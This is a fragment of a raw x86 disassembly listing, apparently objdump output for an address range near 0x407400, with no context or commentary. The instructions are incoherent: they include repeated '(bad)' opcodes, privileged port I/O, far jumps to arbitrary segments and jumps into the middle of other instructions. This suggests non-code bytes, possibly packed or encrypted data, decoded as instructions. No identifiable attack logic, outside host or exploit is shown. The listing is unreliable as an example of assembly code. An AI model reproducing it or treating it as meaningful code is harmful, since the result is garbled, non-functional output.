  4073fe:	outs   dx,DWORD PTR ds:[esi]
  4073ff:	aad    0x17
  407401:	outs   dx,DWORD PTR ds:[esi]
  407402:	jmp    0x40739d
  407404:	mov    esi,0xc1bbd7dc
  407409:	and    eax,0x1878c0c6
  40740e:	dec    esp
  40740f:	in     al,0xf8
  407411:	push   esi
  407412:	adc    cl,dh
  407414:	aaa    
  407415:	cli    
  407416:	mov    ah,0x9d
  407418:	mov    ebx,0x7e66a1
  40741d:	mov    ecx,0x1d537c7b
  407422:	cmp    al,0x6c
  407424:	xchg   ecx,eax
  407425:	ret    
  407426:	mov    edx,0xd7263ee2
  40742b:	aam    0x49
  40742d:	cmp    eax,0x1c2b639e
  407432:	dec    edi
  407433:	aad    0x26
  407435:	in     eax,dx
  407436:	call   0x842a0056
  40743b:	in     eax,0xf4
  40743d:	adc    ebp,DWORD PTR [eax+0x5eed7725]
  407443:	fcomp  QWORD PTR [esp+esi*2]
  407446:	mov    ebp,0x6dac63a0
  40744b:	xchg   edx,eax
  40744c:	xchg   edx,eax
  40744d:	mov    eax,0x714c13e3
  407452:	out    0xd4,al
  407454:	(bad)  
  407455:	cbw    
  407457:	arpl   WORD PTR [ebx],sp
  407459:	popa   
  40745a:	repnz xchg ebx,eax
  40745c:	call   0xf3d1:0xcd4e75e1
  407463:	push   eax
  407464:	daa    
  407465:	mov    ah,0x4e
  407467:	adc    ch,BYTE PTR [eax-0x428c2428]
  40746d:	pop    ebx
  40746e:	fcomp  QWORD PTR [eax-0x7f7a7d97]
  407474:	js     0x407477
  407476:	fwait
  407477:	push   edx
  407478:	pop    ebp
  407479:	jecxz  0x40746e
  40747b:	jmp    0x8a8b:0x9f847929
  407482:	pop    ds
  407483:	mov    bl,0x8
  407485:	dec    eax
  407486:	cmc    
  407487:	pop    esi
  407488:	and    BYTE PTR [ebx+eiz*1],0xa0
  40748c:	loop   0x4074b5
  40748e:	mov    al,es:0x8cfbbf90
  407494:	or     DWORD PTR [edx-0x75],0x81a778ae
  40749b:	add    al,0xa3
  40749d:	or     al,0xe9
  40749f:	jmp    0xb75e:0xce4fb197
  4074a6:	or     DWORD PTR [eax-0x70],0x718bd4ef
  4074ad:	cs mov edi,0xf65f83b
  4074b3:	xchg   edx,eax
  4074b4:	mov    bl,0xb1
  4074b6:	scas   eax,DWORD PTR es:[edi]
  4074b7:	jge    0x407459
  4074b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074ba:	mov    eax,0x856d28ad
  4074bf:	shl    al,1
  4074c1:	add    BYTE PTR [esp+ecx*4],bl
  4074c4:	mov    ecx,0x327b304c
  4074c9:	arpl   WORD PTR [ebp-0x6053b4d0],di
  4074cf:	push   edi
  4074d0:	(bad)  
  4074d1:	hlt    
  4074d2:	pop    ds
  4074d3:	sub    al,0x1
  4074d5:	cmp    DWORD PTR [edx*2-0x2a4f13de],0xf5555c3
  4074e0:	push   di
  4074e2:	popa   
  4074e3:	retf   
  4074e4:	xchg   ecx,eax
  4074e5:	add    eax,DWORD PTR [esi+0xa]
  4074e8:	sbb    DWORD PTR [ebx+0x45165813],0x5c
  4074ef:	shl    DWORD PTR [edx-0x3578da7],0xa0
  4074f6:	cmp    DWORD PTR [eax+0x22],ebx
  4074f9:	retf   
  4074fa:	jbe    0x407569
  4074fc:	test   DWORD PTR [esi-0x34],0x647338b3
  407503:	xchg   edi,eax
  407504:	clc    
  407505:	ins    BYTE PTR es:[edi],dx
  407506:	xchg   esi,eax
  407507:	cli    
  407508:	and    al,0xfc
  40750b:	mov    ah,0xa8
  40750d:	fnsave [edx+0x5f5efe44]
  407513:	call   0xf86a02ee
  407518:	sub    ecx,esp
  40751a:	add    ch,BYTE PTR [esi]
  40751c:	sub    ebp,edx
  40751e:	int3   
  40751f:	fidivr WORD PTR [ebx+edi*4+0x3e]
  407523:	jl     0x40759f
  407525:	mov    WORD PTR [ecx+0x53],ss
  407528:	repnz mov WORD PTR [ebx+0x7e],es
  40752c:	adc    al,0xe
  40752e:	fs int 0x27
  407531:	inc    ebp
  407532:	arpl   WORD PTR [ebx],bp
  407534:	sub    cl,BYTE PTR [ebx]
  407536:	fidivr DWORD PTR ds:0x356697e3
  40753d:	shl    ecx,0xfa
  407540:	fild   QWORD PTR [ebp*8+0x65ba9eba]
  407547:	and    ecx,DWORD PTR [ecx]
  407549:	test   BYTE PTR [eax],bl
  40754b:	in     al,dx
  40754c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40754d:	push   0x444e408a
  407552:	inc    edx
  407553:	addr16 fs aaa 
  407556:	scas   eax,DWORD PTR es:[di]
  407558:	xlat   BYTE PTR ds:[ebx]
  407559:	imul   BYTE PTR [esi+0x3e]
  40755c:	popf   
  40755d:	stos   DWORD PTR es:[edi],eax
  40755e:	in     al,0x4f
  407560:	jmp    0xec99:0x32dbee25
  407567:	sbb    ah,BYTE PTR [edx-0x71]
  40756a:	xor    al,0x74
  40756c:	pop    edi
  40756d:	lock nop
  40756f:	push   0x787b5d24
  407574:	sbb    edi,edx
  407576:	sbb    DWORD PTR [esi-0x1e],edi
  407579:	imul   edi,DWORD PTR ss:[ecx],0x11
  40757d:	jbe    0x407509
  40757f:	mov    ah,0xce
  407581:	in     al,0xdb
  407583:	xchg   edx,eax
  407584:	inc    ebp
  407585:	ds pop eax
  407587:	mov    bl,ch
  407589:	loop   0x407545
  40758b:	jmp    0x934f:0x46f6ec10
  407592:	imul   esp,DWORD PTR [ebp-0x48321932],0xc5ac9a48
  40759c:	in     eax,dx
  40759d:	in     al,dx
  40759e:	ins    BYTE PTR es:[edi],dx
  40759f:	int3   
  4075a0:	pop    es
  4075a1:	ss cld 
  4075a3:	add    al,BYTE PTR [edi+edi*2-0x4e5f2779]
  4075aa:	(bad)  
  4075ab:	int    0x9f
  4075ad:	mov    eax,0x8c070cbe
  4075b2:	scas   eax,DWORD PTR es:[edi]
  4075b3:	sub    eax,0x2602f66
  4075b8:	adc    bl,bh
  4075ba:	sti    
  4075bb:	xchg   edx,eax
  4075bc:	out    dx,al
  4075bd:	daa    
  4075be:	pop    ds
  4075bf:	lds    ecx,FWORD PTR [edi+0x5]
  4075c2:	ret    0x2a04
  4075c5:	jp     0x407560
  4075c7:	adc    BYTE PTR [ecx],bh
  4075c9:	add    BYTE PTR [edi],ah
  4075cb:	mov    ah,0xb8
  4075cd:	push   ss
  4075ce:	mov    ecx,DWORD PTR [eax]
  4075d0:	pop    ebp
  4075d1:	sub    DWORD PTR [bx+si+0x4420],ebx
  4075d6:	ret    
  4075d7:	addr16 push edi
  4075d9:	aaa    
  4075da:	xor    DWORD PTR [eax+0x7bbd2ebb],edx
  4075e0:	fiadd  WORD PTR [eax-0x29]
  4075e3:	retf   
  4075e4:	iret   
  4075e5:	das    
  4075e6:	dec    esp
  4075e7:	mov    bh,0x6
  4075e9:	in     eax,0xed
  4075eb:	fld    TBYTE PTR [ebx-0x6f580539]
  4075f1:	mov    ebx,0xbe1aebf4
  4075f6:	jp     0x4075e0
  4075f8:	cli    
  4075f9:	adc    eax,DWORD PTR [ebp-0x90d4e6c]
  4075ff:	adc    BYTE PTR [edx-0x73eb1c9a],bh
  407605:	add    eax,0xf4ee2eb0
  40760a:	mov    edi,0x78109218
  40760f:	div    DWORD PTR [esi-0x29db5d30]
  407615:	mov    ecx,DWORD PTR [ebx+0x4e]
  407618:	retf   0x90da
  40761b:	imul   ebp,DWORD PTR [eax+0x63],0x573a3b49
  407622:	adc    edi,ebp
  407624:	add    edi,esi
  407626:	pop    eax
  407627:	mov    ds:0x2d4360da,eax
  40762c:	arpl   WORD PTR [ebx-0x685eeacf],di
  407632:	fist   DWORD PTR [edx+0xf]
  407635:	retf   0x60d8
  407638:	cmp    al,0xd8
  40763a:	sub    edx,esp
  40763c:	enter  0xf598,0xe6
  407640:	mov    ch,0x75
  407642:	xor    al,0xa9
  407644:	je     0x4075fd
  407646:	dec    edx
  407647:	mov    BYTE PTR [esi+esi*4-0xfa60dbe],al
  40764e:	sub    dh,BYTE PTR [ecx+0x41e4b205]
  407654:	jmp    0x40764a
  407656:	inc    ebp
  407657:	cs pop es
  407659:	std    
  40765a:	lahf   
  40765b:	cmp    bl,BYTE PTR [eax+0x47]
  40765e:	lds    ebx,FWORD PTR [ecx-0x502c6713]
  407664:	imul   ebx,edi,0x30
  407667:	cli    
  407668:	not    DWORD PTR [edi-0x5ce81ee1]
  40766e:	cdq    
  40766f:	cs push edi
  407671:	into   
  407672:	cmp    DWORD PTR [ecx-0x7e9c73e5],edi
  407678:	loope  0x4076a5
  40767a:	cmp    ah,al
  40767c:	sub    esp,DWORD PTR [esi+0x4284c7]
  407682:	add    ah,BYTE PTR [ebx+eax*4+0x535db37]
  407689:	mov    ebp,esi
  40768b:	push   ecx
  40768c:	sahf   
  40768d:	repz sub eax,DWORD PTR [ebp-0x2cc0b429]
  407694:	mov    ah,0x0
  407696:	(bad)  
  407697:	out    dx,al
  407698:	push   edx
  407699:	mov    dh,0xaa
  40769b:	sbb    BYTE PTR [edx+0x56c28b5a],ah
  4076a1:	mov    ch,0xbf
  4076a3:	xor    dl,dh
  4076a5:	test   eax,0x84014da0
  4076aa:	pop    eax
  4076ab:	repnz test al,0xff
  4076ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076af:	sub    dl,BYTE PTR [ebp-0xbed1265]
  4076b5:	sub    edx,ecx
  4076b7:	int3   
  4076b8:	sbb    BYTE PTR [esi-0x29e01899],bh
  4076be:	test   BYTE PTR [eax-0x80],dh
  4076c1:	xor    bh,BYTE PTR [ebp+ecx*8-0x35]
  4076c5:	lock inc edi
  4076c7:	in     al,dx
  4076c8:	scas   al,BYTE PTR es:[edi]
  4076c9:	test   al,0x1c
  4076cb:	dec    esp
  4076cc:	xor    cl,bh
  4076ce:	mov    cl,0xbc
  4076d0:	pusha  
  4076d1:	add    DWORD PTR [edi-0x42],esi
  4076d4:	(bad)  
  4076d5:	ss push ebx
  4076d7:	cdq    
  4076d8:	icebp  
  4076d9:	dec    edi
  4076da:	(bad)  
  4076db:	and    eax,0x69cf778e
  4076e0:	sub    al,0x94
  4076e2:	cmp    BYTE PTR [edx],al
  4076e4:	sbb    edx,DWORD PTR [esi+eiz*8+0x38]
  4076e8:	xor    bl,dh
  4076ea:	mov    ds:0xbbbdce00,al
  4076ef:	das    
  4076f0:	repnz loope 0x40772d
  4076f3:	inc    ebx
  4076f4:	jns    0x407768
  4076f6:	inc    esp
  4076f7:	jb     0x407690
  4076f9:	add    BYTE PTR [ebx-0x24d55ae3],cl
  4076ff:	ret    
  407700:	xor    BYTE PTR [ebx-0x1],dh
  407703:	das    
  407704:	inc    eax
  407705:	sub    al,0xe0
  407707:	dec    ecx
  407708:	shl    BYTE PTR [edi],0xf8
  40770b:	pusha  
  40770c:	repz adc ebp,DWORD PTR [ecx+0x1]
  407710:	scas   al,BYTE PTR es:[edi]
  407711:	adc    ebx,ebx
  407713:	inc    edi
  407714:	push   ss
  407715:	lods   al,BYTE PTR ds:[esi]
  407716:	mov    ah,0x1b
  407718:	fs cmc 
  40771a:	xchg   ebx,eax
  40771b:	sub    eax,0xd54dfefe
  407720:	mov    cl,0xac
  407722:	sub    al,0xeb
  407724:	js     0x4076b4
  407726:	lock cld 
  407728:	repz or al,0xa3
  40772b:	repz fstp TBYTE PTR [ebp+0x7fd81b1b]
  407732:	mov    dh,0xd9
  407734:	xor    al,0x3c
  407736:	jg     0x4076da
  407738:	popa   
  407739:	fnsave [eax-0x76774125]
  40773f:	sbb    BYTE PTR [ebp+0x1f],bh
  407742:	sar    DWORD PTR [eax-0x926c086],1
  407748:	xor    BYTE PTR [ebx-0x674c802a],al
  40774e:	jmp    0x40773f
  407750:	mov    eax,ds:0x859300e2
  407755:	mov    eax,ds:0xad7748f3
  40775a:	js     0x4077a8
  40775c:	call   0x49c3b137
  407761:	(bad)  
  407763:	jmp    0x88e6:0xec3b1c51
  40776a:	dec    ebp
  40776b:	pusha  
  40776c:	aad    0x49
  40776e:	dec    edx
  40776f:	mov    ecx,esp
  407771:	cwde   
  407772:	pop    edx
  407773:	repz sar BYTE PTR [ecx+ebp*2-0x29],cl
  407778:	mov    esi,0xdb67da39
  40777d:	adc    BYTE PTR [esi+0xc],bl
  407780:	cmp    DWORD PTR [ebp+0x23],ecx
  407783:	xchg   edi,eax
  407784:	mov    dh,0xd9
  407786:	mov    gs,ebp
  407788:	jbe    0x4077bf
  40778a:	inc    ebx
  40778b:	js     0x4077c4
  40778d:	call   0xe01f7829
  407792:	and    eax,0x1bfcfd2f
  407797:	xor    DWORD PTR [esp+esi*2],edi
  40779a:	jns    0x4077c0
  40779c:	jg     0x4077f8
  40779e:	lods   al,BYTE PTR ds:[esi]
  40779f:	add    al,0x74
  4077a1:	jo     0x4077d5
  4077a3:	fs call 0x1d91:0x8911c81c
  4077ab:	or     DWORD PTR [esp+eax*1],eax
  4077ae:	(bad)  
  4077af:	cs aam 0x74
  4077b2:	adc    dh,BYTE PTR [edx]
  4077b4:	push   ds
  4077b5:	push   edi
  4077b6:	stc    
  4077b7:	sub    ecx,esi
  4077b9:	sbb    ecx,edx
  4077bb:	push   edi
  4077bc:	mov    bh,0x95
  4077be:	xor    dh,cl
  4077c0:	xchg   ebp,eax
  4077c1:	(bad)  
  4077c2:	outs   dx,DWORD PTR ds:[esi]
  4077c3:	int    0x4
  4077c5:	xlat   BYTE PTR ds:[ebx]
  4077c6:	imul   DWORD PTR [eax-0x453c8819]
  4077cc:	xor    eax,0xfd7061f8
  4077d1:	push   edi
  4077d2:	xchg   DWORD PTR [esi],edx
  4077d4:	xlat   BYTE PTR ds:[ebx]
  4077d5:	push   ecx
  4077d6:	fistp  WORD PTR [edi-0x60]
  4077d9:	mov    ch,0x43
  4077db:	cmc    
  4077dc:	mov    al,ds:0xb9b70dc5
  4077e1:	cmp    al,0xc9
  4077e3:	push   eax
  4077e5:	retf   
  4077e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077e7:	std    
  4077e8:	xlat   BYTE PTR ds:[ebx]
  4077e9:	sar    dl,cl
  4077eb:	adc    DWORD PTR [edi+esi*4+0x5a914b81],esi
  4077f2:	mov    dl,0xb0
  4077f4:	xor    edx,DWORD PTR [esi]
  4077f6:	pop    esp
  4077f7:	loop   0x4077aa
  4077f9:	or     cl,BYTE PTR [edi+0x5d]
  4077fc:	addr16 pusha 
  4077fe:	adc    bh,BYTE PTR [ebx+0x1bf4b5cc]
  407804:	push   edx
  407805:	pop    edx
  407806:	lds    eax,FWORD PTR [eax-0x3]
  407809:	iret   
  40780a:	or     eax,0xe191c80e
  40780f:	mov    WORD PTR [esi-0x549b01ae],ds
  407815:	dec    ebp
  407816:	sti    
  407817:	or     al,0x83
  407819:	mov    dl,0xc9
  40781b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40781c:	mov    eax,0x1f5f8788
  407821:	sbb    al,0x94
  407823:	fs mov dh,0xf1
  407826:	xchg   edi,eax
  407827:	push   ecx
  407828:	pusha  
  407829:	out    0xeb,al
  40782b:	not    bl
  40782d:	or     al,0xf9
  40782f:	jnp    0x4077b5
  407831:	not    DWORD PTR [eax]
  407833:	xlat   BYTE PTR ds:[ebx]
  407834:	push   edx
  407835:	(bad)  
  407836:	das    
  407837:	dec    eax
  407838:	hlt    
  407839:	test   DWORD PTR [eax+esi*8-0x3e3f3a30],ecx
  407840:	or     DWORD PTR [edx+0x31],ebp
  407843:	jns    0x407889
  407845:	mov    ebx,0x47b9031a
  40784a:	jmp    0x40786f
  40784c:	xor    DWORD PTR [edx],esp
  40784e:	loope  0x407885
  407850:	hlt    
  407851:	test   BYTE PTR [ecx-0x6d6a31c],0xba
  407858:	mov    edi,0x2f701232
  40785d:	xchg   edx,eax
  40785e:	int    0xf7
  407860:	ret    
  407861:	sbb    al,0xb5
  407863:	jle    0x4078aa
  407865:	ror    ah,1
  407867:	std    
  407868:	fdivr  QWORD PTR [ecx-0x25c84582]
  40786e:	stc    
  40786f:	dec    ebx
  407870:	aas    
  407871:	add    ebp,esp
  407873:	pusha  
  407874:	ret    0x60cb
  407877:	addr16 inc esi
  407879:	xor    BYTE PTR [edx-0x540634d9],dl
  40787f:	pusha  
  407880:	mov    al,ds:0x6504c41b
  407885:	(bad)  
  407886:	and    al,0x2a
  407888:	test   BYTE PTR [ebp+0xe27616d],al
  40788e:	jl     0x4078f4
  407890:	push   edx
  407891:	fdiv   QWORD PTR [edx]
  407893:	repz xor eax,0x4cba06d3
  407899:	cli    
  40789a:	jno    0x4078e6
  40789c:	jno    0x407850
  40789e:	cmp    al,0x57
  4078a0:	push   eax
  4078a1:	popf   
  4078a2:	loop   0x4078eb
  4078a4:	mov    esi,0x56b7a6e
  4078a9:	pop    edi
  4078aa:	dec    esp
  4078ab:	dec    edi
  4078ac:	cli    
  4078ad:	iret   
  4078ae:	sbb    BYTE PTR [ecx-0x42608daf],dl
  4078b4:	int3   
  4078b5:	cli    
  4078b6:	mov    ch,0x3b
  4078b8:	inc    esp
  4078b9:	stos   BYTE PTR es:[edi],al
  4078ba:	pop    eax
  4078bb:	jg     0x40790e
  4078bd:	ja     0x4078ef
  4078bf:	mov    ah,0xaf
  4078c1:	mov    ds:0x65beb7bb,al
  4078c6:	cdq    
  4078c7:	fisttp DWORD PTR [esp+edi*2-0x231916ff]
  4078ce:	pushf  
  4078cf:	mov    dl,0x14
  4078d1:	scas   eax,DWORD PTR es:[edi]
  4078d2:	iret   
  4078d3:	rol    bl,0x9
  4078d6:	jne    0x407860
  4078d8:	mov    cl,0x73
  4078da:	mov    ?,WORD PTR [esi+0x6a]
  4078dd:	ja     0x4078dd
  4078df:	or     dl,bh
  4078e1:	ins    BYTE PTR es:[edi],dx
  4078e2:	xchg   BYTE PTR [esi+eiz*2+0x2b0aa7b9],bl
  4078e9:	mov    ds:0x10e21c07,al
  4078ee:	ins    BYTE PTR es:[edi],dx
  4078ef:	xor    BYTE PTR ds:0x25066c56,ah
  4078f5:	ds loopne 0x407884
  4078f8:	jns    0x40796a
  4078fa:	retf   
  4078fb:	pop    ebp
  4078fc:	je     0x4078ff
  4078fe:	mov    ds:0xee7e4fe9,al
  407903:	int    0x7b
  407905:	(bad)  
  407906:	rcl    DWORD PTR [ecx+0x4bbb3207],1
  40790c:	mov    WORD PTR [eax-0x79],ds
  40790f:	xchg   esi,eax
  407910:	aad    0x3e
  407912:	add    eax,0xb6fc8806
  407917:	mov    eax,0x828224a7
  40791c:	por    mm6,QWORD PTR ds:0x8b4bb852
  407923:	rcr    esp,1
  407925:	mov    ds:0x65cc9dde,al
  40792a:	std    
  40792b:	call   0x641:0x4edb53a2
  407932:	cmp    eax,0x4d9fe31
  407937:	les    ebp,FWORD PTR [ebx+eiz*8]
  40793a:	xor    BYTE PTR [esi],0x2d
  40793d:	xchg   DWORD PTR [esi-0x25],esi
  407940:	cld    
  407941:	leave  
  407942:	jg     0x40791a
  407944:	mov    eax,0x5dd57c2
  407949:	mov    ch,0x65
  40794b:	xor    dl,BYTE PTR [edi+0x19313374]
  407951:	pop    eax
  407952:	repnz add edi,edi
  407955:	push   0x13
  407957:	inc    edi
  407958:	fwait
  407959:	sbb    edx,DWORD PTR [ebx+0x7611cdff]
  40795f:	xchg   ebp,eax
  407960:	pop    ebx
  407961:	jmp    FWORD PTR [esi]
  407963:	int    0x3c
  407965:	xor    eax,0x8f8624b9
  40796a:	ror    cl,1
  40796c:	test   DWORD PTR [edx+0x75],esp
  40796f:	xchg   ebx,eax
  407970:	or     DWORD PTR [edi-0x14],esi
  407973:	push   ds
  407974:	fstp   DWORD PTR [ebx-0x6]
  407977:	push   es
  407978:	pop    edx
  407979:	cmp    ecx,DWORD PTR [ecx]
  40797b:	cld    
  40797c:	mov    ebp,0xafb95b7a
  407981:	mov    esi,0x7706505f
  407986:	sbb    ch,BYTE PTR gs:[edi+0x53]
  40798a:	pushf  
  40798b:	add    bl,BYTE PTR ss:[edi-0x51]
  40798f:	fmul   st,st(6)
  407991:	xor    DWORD PTR [edi],0xe047786c
  407997:	jmp    0x25fb:0x6e2a65a3
  40799e:	addr16 inc edx
  4079a0:	mov    ch,0x34
  4079a2:	mov    al,0xb0
  4079a4:	xchg   ecx,eax
  4079a5:	dec    edx
  4079a6:	inc    esp
  4079a7:	leave  
  4079a8:	xchg   edi,eax
  4079a9:	ins    BYTE PTR es:[edi],dx
  4079aa:	xchg   DWORD PTR [ebx+0x2018371],esp
  4079b0:	sub    bl,BYTE PTR [edx]
  4079b2:	mov    ah,0x6e
  4079b4:	mov    esi,0xb81b2b7b
  4079b9:	pop    eax
  4079ba:	out    0x21,al
  4079bc:	outs   dx,BYTE PTR ds:[esi]
  4079bd:	add    BYTE PTR [edi-0x772d8f39],bl
  4079c3:	mov    BYTE PTR [esi],0x8d
  4079c6:	pop    ecx
  4079c7:	(bad)  
  4079c8:	pop    ds
  4079c9:	xor    eax,0xf5cf4b4e
  4079ce:	jmp    0x517d899b
  4079d3:	fdiv   DWORD PTR [ecx+0x47]
  4079d6:	sar    DWORD PTR [ecx+0x18c0c575],0x3e
  4079dd:	and    BYTE PTR [esi-0x5a057ee],bl
  4079e3:	xchg   ebx,eax
  4079e4:	loop   0x407993
  4079e6:	cmp    BYTE PTR [edx],0xf2
  4079e9:	(bad)  
  4079ea:	rcr    DWORD PTR [ecx-0x6f],0x5e
  4079ee:	popa   
  4079ef:	mov    ecx,0xe86487d3
  4079f4:	(bad)  
  4079f5:	fsubp  st(1),st
  4079f7:	clc    
  4079f8:	idiv   DWORD PTR [ebx]
  4079fa:	sar    ebx,cl
  4079fc:	lods   al,BYTE PTR ds:[esi]
  4079fd:	dec    ebp
  4079fe:	rcl    ebx,1
  407a00:	(bad)  
  407a01:	push   ecx
  407a02:	aaa    
  407a03:	(bad)  
  407a04:	cli    
  407a05:	sub    ebp,DWORD PTR [ecx+0x778bc15e]
  407a0b:	push   ds
  407a0c:	fst    DWORD PTR [esi+0xd6d7b5d]
  407a12:	ja     0x4079ef
  407a14:	hlt    
  407a15:	pop    esi
  407a16:	(bad)  
  407a17:	adc    dl,ah
  407a19:	mov    bh,BYTE PTR [eax]
  407a1b:	adc    cl,0x96
  407a1e:	pop    eax
  407a20:	sbb    ecx,DWORD PTR [ebp-0x2df2a342]
  407a26:	rcl    DWORD PTR [ecx+0x1e],0x5c
  407a2a:	xlat   BYTE PTR ds:[ebx]
  407a2b:	shr    BYTE PTR [eax+0x36ae1add],0xa1
  407a32:	adc    al,0x78
  407a34:	and    eax,0x1d9f075d
  407a39:	out    dx,al
  407a3a:	pop    eax
  407a3b:	sbb    BYTE PTR [esi+0x372d47ed],cl
  407a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a42:	aam    0x6d
  407a44:	xor    ch,BYTE PTR [edi+0x6b]
  407a47:	push   0x6
  407a49:	cmp    eax,0x7a8af3dd
  407a4e:	push   ebx
  407a4f:	xchg   edi,eax
  407a50:	imul   esp,DWORD PTR [edx],0xe17f3602
  407a56:	inc    eax
  407a57:	push   ebp
  407a58:	out    0x28,al
  407a5a:	out    0x44,al
  407a5c:	cmp    al,0x37
  407a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a5f:	(bad)  
  407a60:	(bad)  
  407a62:	fsubr  DWORD PTR [ebx-0x9]
  407a65:	aaa    
  407a66:	add    al,0x8f
  407a68:	in     al,0x67
  407a6a:	in     al,dx
  407a6b:	cmp    eax,0xfed3dc51
  407a70:	jmp    0x86f6026
  407a75:	mov    cl,0x3f
  407a77:	ja     0x407a2a
  407a79:	sub    esi,ebp
  407a7b:	cli    
  407a7c:	mov    al,0x86
  407a7e:	cdq    
  407a7f:	scas   al,BYTE PTR es:[edi]
  407a80:	fbld   TBYTE PTR [ecx+0x3d]
  407a83:	pop    sp
  407a85:	xchg   edi,eax
  407a86:	cmp    BYTE PTR [esi+0x36bd1528],dl
  407a8c:	ds xchg esp,eax
  407a8e:	push   esp
  407a8f:	inc    esp
  407a90:	sbb    DWORD PTR [eax-0x2c8b5eb7],eax
  407a96:	inc    edx
  407a97:	and    edi,DWORD PTR [esi-0x70]
  407a9a:	hlt    
  407a9b:	mov    ch,0x8b
  407a9d:	bound  ecx,QWORD PTR [esi+edi*8-0x19]
  407aa1:	clc    
  407aa2:	sbb    al,0x98
  407aa4:	xor    dh,bl
  407aa6:	hlt    
  407aa7:	(bad)  
  407aa9:	push   0x96096fb7
  407aae:	or     al,0x2
  407ab0:	adc    al,0x64
  407ab2:	sahf   
  407ab3:	fld    QWORD PTR [eax+0x1ece5939]
  407ab9:	int    0x8e
  407abb:	add    eax,0x5241b909
  407ac0:	pop    edi
  407ac1:	out    0x27,eax
  407ac3:	mov    ebx,0x812c7167
  407ac8:	and    bl,BYTE PTR [ebp+0x253257a6]
  407ace:	jmp    0x407a69
  407ad0:	hlt    
  407ad1:	js     0x407ad7
  407ad3:	jb     0x407a99
  407ad5:	pop    ebp
  407ad6:	push   edi
  407ad7:	push   0x65
  407ad9:	imul   esi,DWORD PTR [edi],0xffffffea
  407adc:	sbb    BYTE PTR [di-0x5f5a],ah
  407ae1:	cmp    ebx,edi
  407ae3:	cld    
  407ae4:	xor    eax,0xf2a2a2fd
  407ae9:	mov    eax,0xf156e67
  407aee:	test   eax,0xea7a9a5f
  407af3:	xor    eax,0x1f024904
  407af8:	icebp  
  407af9:	lds    ebx,FWORD PTR [edi-0x80]
  407afc:	xchg   ebx,eax
  407afd:	fld    TBYTE PTR [ebp+eiz*4-0x2ebc1600]
  407b04:	fstp   DWORD PTR [eax+0x4b]
  407b07:	js     0x407aa9
  407b09:	cmp    eax,0x2fbde3c9
  407b0e:	enter  0x16c2,0x1f
  407b12:	xor    bl,BYTE PTR [ebx]
  407b14:	jmp    0x13c68681
  407b19:	lds    ebx,FWORD PTR [esi]
  407b1b:	inc    eax
  407b1c:	sbb    BYTE PTR [ebp-0x22],ch
  407b1f:	enter  0x5779,0x2a
  407b23:	hlt    
  407b24:	hlt    
  407b25:	mov    edx,0x233c8cf8
  407b2a:	pop    ecx
  407b2b:	xchg   edi,eax
  407b2c:	call   0x6bfc:0x32214e41
  407b33:	clc    
  407b34:	dec    eax
  407b35:	dec    edi
  407b36:	les    edi,FWORD PTR [eax-0xc]
  407b39:	pop    eax
  407b3a:	jae    0x407b12
  407b3c:	pop    esp
  407b3d:	and    eax,0x36daae9a
  407b42:	out    dx,eax
  407b43:	mov    ebp,0x7e2cdf38
  407b48:	lock outs dx,DWORD PTR ds:[esi]
  407b4a:	loop   0x407b41
  407b4c:	lods   eax,DWORD PTR ds:[esi]
  407b4d:	pop    edi
  407b4e:	xor    DWORD PTR [ecx],eax
  407b50:	sbb    ah,BYTE PTR [edi]
  407b52:	in     al,dx
  407b53:	(bad)  
  407b55:	xchg   esi,eax
  407b56:	or     eax,0x59c2f276
  407b5b:	(bad)  
  407b5c:	scas   al,BYTE PTR es:[edi]
  407b5d:	xchg   esi,eax
  407b5e:	ins    DWORD PTR es:[edi],dx
  407b5f:	fldcw  WORD PTR [eax+edi*8-0x3b62efd0]
  407b66:	xchg   BYTE PTR [ecx],al
  407b68:	mov    edi,0x8ef9d2ab
  407b6d:	(bad)  
  407b6e:	js     0x407b15
  407b70:	and    dl,BYTE PTR [edx]
  407b72:	in     al,dx
  407b73:	dec    edi
  407b74:	xchg   edi,eax
  407b75:	inc    esp
  407b76:	mov    ds:0x98ed3c9e,eax
  407b7b:	test   esi,edx
  407b7d:	iret   
  407b7e:	mov    ecx,0x2629d36
  407b83:	push   ds
  407b84:	adc    bl,bh
  407b86:	adc    DWORD PTR [edi],ebp
  407b88:	and    eax,0xb255e518
  407b8d:	test   al,0xe3
  407b8f:	mov    ah,0x29
  407b91:	push   sp
  407b93:	test   BYTE PTR [eax+0x23560ebe],bh
  407b99:	or     al,0x14
  407b9b:	or     eax,0x20e44f11
  407ba0:	mov    dh,0xbf
  407ba2:	(bad)  
  407ba3:	in     eax,dx
  407ba4:	sbb    DWORD PTR [ebx-0x6e6846b1],ebx
  407baa:	mov    ds:0xfc1dc640,eax
  407baf:	push   esi
  407bb0:	shl    DWORD PTR [ebx+0x691809f9],0x6d
  407bb7:	jp     0x407bbe
  407bb9:	fcom   DWORD PTR [ebp+0x49da0bcb]
  407bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc0:	aam    0x4b
  407bc2:	mov    eax,ds:0xed7a6ae1
  407bc7:	push   cs
  407bc8:	ja     0x407bdd
  407bca:	sti    
  407bcb:	out    0x4,eax
  407bcd:	ret    0x2f04
  407bd0:	mov    al,0xdb
  407bd2:	and    eax,0xe8523f92
  407bd7:	aad    0x1a
  407bd9:	fcmovbe st,st(4)
  407bdb:	pop    ebx
  407bdc:	add    DWORD PTR [eax+0x4282cde2],esp
  407be2:	shl    DWORD PTR [ebx-0x28],1
  407be5:	popa   
  407be6:	cld    
  407be7:	nop
  407be8:	cmp    eax,ebx
  407bea:	mov    ch,0xc1
  407bec:	es xchg esi,eax
  407bee:	jo     0x407c6e
  407bf0:	mov    al,0xf5
  407bf2:	or     BYTE PTR [ebx-0x2daa8af4],0xbf
  407bf9:	mov    bl,0x74
  407bfb:	sub    DWORD PTR [edi],edx
  407bfd:	mov    esi,0x6eb155f
  407c02:	aas    
  407c03:	test   eax,0x27995d3b
  407c08:	fsubp  st(7),st
  407c0a:	enter  0x6850,0x51
  407c0e:	sub    eax,0xe95489e0
  407c13:	les    edx,FWORD PTR [edx]
  407c15:	or     edi,esi
  407c17:	jl     0x407bef
  407c19:	push   0xa1d09e04
  407c1e:	mov    bh,0x1c
